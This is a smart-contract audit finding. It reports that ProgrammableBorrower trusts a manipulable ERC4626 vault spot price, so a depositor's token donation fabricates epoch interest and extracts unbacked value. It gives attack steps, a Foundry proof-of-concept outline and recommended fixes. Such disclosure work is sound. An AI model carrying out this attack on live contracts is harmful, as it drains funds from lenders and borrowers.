### Title
Unverified ERC4626 vault spot price lets a vault depositor fabricate epoch interest and mint/withdraw unbacked value - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` derives the pool's epoch interest from the live `convertToAssets` valuation of an external ERC4626 vault. An unprivileged vault depositor can inflate the share price with a direct token donation (or a transient share-price manipulation), causing `totalInterestDueNow()` to report fake interest. `IdleCDOEpochVariant.stopEpoch` trusts this value and — in minted-interest mode — mints unbacked strategy tokens and raises tranche prices, and in cash mode pulls the fabricated amount from the borrower. The one sanity bound (`maxApr`) is skipped for programmable borrowers because `_resolveStopEpochInterest` constrains `_interest` to `0`/`1`, so `if (_mintInterest && _interest > 1)` never runs.

### Finding Description
The external report's bug class is "data that should be recomputed on-chain is trusted from an untrusted source." The analog is `ProgrammableBorrower._vaultNetInterest`:

```solidity
uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
```
(`contracts/strategies/idle/ProgrammableBorrower.sol`, `_vaultNetInterest` / `totalInterestDueNow`, ~L330-347). `_currentVaultAssets()` is `vault.convertToAssets(vault.balanceOf(this))` — pure spot price, no TWAP, no bound.

`stopEpoch` in `IdleCDOEpochVariant` resolves interest via `totalInterestDueNow()` in programmable mode, then:
- mints `_grossInterest` strategy tokens when `isInterestMinted` (`contracts/IdleCDOEpochVariant.sol` ~L428-433),
- calls `_updateAccounting()`, distributing the fake interest into tranche `virtualPrice` and `unclaimedFees`/fee-receiver shares (~L436-447),
- in non-minted mode, `getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws)` makes the honest borrower transfer the fabricated interest as real underlyings (~L408).

The `maxApr` cap (`_checkNotAllowed(_maxApr != 0 && _grossInterest > _calcInterestWithApr(...))`, ~L377-379) is guarded by `_interest > 1`, while `_resolveStopEpochInterest` reverts for `_interest > 1` in programmable mode (~L1001-1004). So the cap is structurally unreachable exactly in the mode where interest is externally sourced.

### Impact Explanation
Direct theft / insolvency. Attacker (a KYC lender holding a dominant share of tranches, plus a small ERC4626 vault position — both allowed roles):

1. Epoch running; attacker deposits into the vault, then donates `D` underlying directly to the vault (or another holder), inflating `convertToAssets` by ~`D × borrower's share fraction`.
2. `totalInterestDueNow()` now reports contractual interest + `D`.
3. Honest manager calls `stopEpoch` → fake interest is minted into strategy tokens / booked into tranche prices (minted mode) or pulled as real cash from the borrower (cash mode).
4. Attacker `requestWithdraw` + `claimWithdrawRequest` at the inflated price, extracting underlyings worth principal + ~`D` that are not backed by real yield; the borrower is overcharged or later claimants are left with unbacked receipts (insolvency).
5. Attacker redeems their vault shares, recapturing nearly all of `D` (they absorb only the `borrowerShares/totalShares` fraction as a cost, which is the same amount credited to the pool — but the pool credit is captured ~entirely by the attacker via their tranche dominance and the minted fee split). Net gain ≈ `D × (trancheShare − vaultShareFraction)` plus inflated fee-shares if the attacker is positioned accordingly.

The invariant broken is fair mint/burn / solvency: tranche price and minted strategy tokens must be backed by real accrued yield, not by manipulable vault spot valuation.

### Likelihood Explanation
Requires a programmable-borrower deployment (in scope per the prompt's surface list) and a vault whose price is donation-influenceable (most ERC4626 vaults, including MetaMorpho-style, reprice instantly on direct transfers). No privileged role is needed: the attacker is just a tranche holder and a vault depositor/direct token sender, and honest manager `stopEpoch` is sequenced around, not performed by, the attacker. The missing `maxApr` check makes the magnitude unbounded.

### Recommendation
- Apply the `maxApr`-derived interest bound in programmable mode too: cap `totalInterestDueNow()` at `_calcInterestWithApr(getContractValue(), maxApr) + _pendingWithdrawFees`, or move the cap inside `_resolveStopEpochInterest`.
- Use a manipulation-resistant vault valuation (e.g., `convertToAssets` on a smoothed/TWAP share price, or track realized PnL only via actual `vault.withdraw`/`redeem` proceeds rather than spot `convertToAssets`).
- In minted mode, only mint strategy tokens for interest that has actually been realized in cash or verifiably settled by `settleBorrowerInterest`, not for unrealized vault mark-to-market.

### Proof of Concept
Foundry fork PoC outline (mirroring `test/foundry/ProgrammableBorrowerCreditVault.t.sol` setup with `isInterestMinted = true`):

```solidity
function testVaultDonationFabricatesEpochInterest() external {
    uint256 amount = 10_000 * oneScale;
    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    // attacker is dominant tranche holder
    uint256 minted = idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(0);

    // attacker deposits small position into the ERC4626 vault, then donates D
    uint256 D = 500 * oneScale;
    deal(defaultUnderlying, attacker, D);
    vm.startPrank(attacker);
    underlying.approve(address(vault), D);
    vault.deposit(1 * oneScale, attacker);        // small share position
    underlying.transfer(address(vault), D);        // donation -> convertToAssets up
    vm.stopPrank();

    uint256 fakeInterest = programmableBorrower.vaultInterestAccrued();
    assertApproxEqAbs(fakeInterest, D, 10);

    // honest manager stops epoch; maxApr check is skipped (programmable path)
    deal(defaultUnderlying, borrower, pendingWithdraws); // borrower only funds real liabilities
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // tranche price / minted strategy tokens now include fabricated interest
    assertGt(cdoEpoch.virtualPrice(address(aaTranche)), pricePre, "inflated by fake interest");

    // attacker requests withdraw at inflated price; borrower-funded cash at next stop pays it out
    cdoEpoch.requestWithdraw(0, address(aaTranche));
    _startEpochAndCheckPrices(1);
    deal(defaultUnderlying, borrower, IdleCreditVault(strategy).pendingWithdraws());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    // attacker received principal + D while donating ~nothing net (vault shares redeemed)
}
```

Key assertions: `vaultInterestAccrued() ≈ D` before `stopEpoch`, `lastEpochInterest`/`virtualPrice` include `D` despite no real yield, and the attacker's claim exceeds deposited principal by approximately `D` minus the pro-rata share absorbed by their own vault position.
